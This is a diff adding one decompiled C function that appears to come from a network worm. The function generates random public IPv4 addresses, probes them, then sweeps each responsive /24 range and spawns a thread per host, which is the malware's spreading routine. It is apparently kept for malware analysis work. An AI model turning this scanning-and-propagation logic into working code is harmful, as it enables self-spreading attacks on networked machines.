@@ -1,0 +1,88 @@
+void __stdcall __noreturn sub_407840(int a1)
+{
+  DWORD (__stdcall *v1)(); // esi
+  DWORD TickCount; // edi
+  HANDLE CurrentThread; // ebp
+  DWORD v4; // ebp
+  DWORD v5; // eax
+  signed int v6; // ebp
+  unsigned int v7; // ebx
+  unsigned int v8; // eax
+  unsigned int v9; // eax
+  int v10; // edi
+  void *v11; // esi
+  void *v12; // eax
+  void *v13; // esi
+  int v14; // [esp+10h] [ebp-118h]
+  int v15; // [esp+14h] [ebp-114h]
+  unsigned int v16; // [esp+18h] [ebp-110h]
+  signed int v17; // [esp+1Ch] [ebp-10Ch]
+  DWORD v18; // [esp+1Ch] [ebp-10Ch]
+  __time32_t Time; // [esp+20h] [ebp-108h] BYREF
+  char Buffer[260]; // [esp+24h] [ebp-104h] BYREF
+
+  v1 = GetTickCount;
+  v14 = 1;
+  v15 = 1;
+  TickCount = GetTickCount();
+  time(&Time);
+  CurrentThread = GetCurrentThread();
+  v4 = (DWORD)CurrentThread + GetCurrentThreadId();
+  v5 = GetTickCount();
+  srand(v4 + Time + v5);
+  v6 = v17;
+  while ( 1 )
+  {
+    do
+    {
+      if ( v1() - TickCount > 0x249F00 )
+        v14 = 1;
+      if ( v1() - TickCount > 0x124F80 )
+        v15 = 1;
+      if ( !v14 )
+        break;
+      if ( a1 >= 32 )
+        break;
+      v6 = sub_407660() % 0xFFu;
+    }
+    while ( v6 == 127 || v6 >= 224 );
+    if ( v15 && a1 < 32 )
+      v16 = sub_407660() % 0xFFu;
+    v7 = sub_407660() % 0xFFu;
+    v8 = sub_407660();
+    sprintf(Buffer, "%d.%d.%d.%d", v6, v16, v7, v8 % 0xFF);
+    v9 = inet_addr(Buffer);
+    if ( (int)sub_407480(v9) > 0 )
+      break;
+LABEL_23:
+    Sleep(0x64u);
+  }
+  v14 = 0;
+  v15 = 0;
+  v18 = v1();
+  v10 = 1;
+  while ( 1 )
+  {
+    sprintf(Buffer, "%d.%d.%d.%d", v6, v16, v7, v10);
+    v11 = (void *)inet_addr(Buffer);
+    if ( (int)sub_407480(v11) <= 0 )
+      goto LABEL_20;
+    v12 = (void *)beginthreadex(0, 0, StartAddress, v11, 0, 0);
+    v13 = v12;
+    if ( v12 )
+      break;
+LABEL_21:
+    if ( ++v10 >= 255 )
+    {
+      TickCount = v18;
+      v1 = GetTickCount;
+      goto LABEL_23;
+    }
+  }
+  if ( WaitForSingleObject(v12, 0x36EE80u) == 258 )
+    TerminateThread(v13, 0);
+  CloseHandle(v13);
+LABEL_20:
+  Sleep(0x32u);
+  goto LABEL_21;
+}
